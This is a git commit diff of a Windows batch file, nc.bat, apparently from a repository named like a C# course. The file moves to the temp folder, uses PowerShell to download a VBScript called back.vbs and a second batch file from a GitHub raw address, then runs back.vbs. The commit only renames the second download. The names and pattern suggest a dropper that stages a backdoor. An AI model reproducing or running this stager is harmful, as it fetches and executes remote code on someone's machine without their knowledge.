1d4fab9245c6e49b67103240e8ef01e26775191b
Rafael Ferreira Pedrosa <rafaelfepedrosa@gmail.com>
2022-05-27 16:07:27 -0300

    Update nc.bat

--- nc.bat
+++ nc.bat
@@ -1,5 +1,5 @@
 cd %TEMP%
 powershell (new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/rfaelfp/c-sharpI/main/back.vbs','back.vbs')
-powershell (new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/rfaelfp/c-sharpI/main/nc.bat2','nc.bat2')
+powershell (new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/rfaelfp/c-sharpI/main/nc2.bat2','nc2.bat')
 back.vbs
 exit
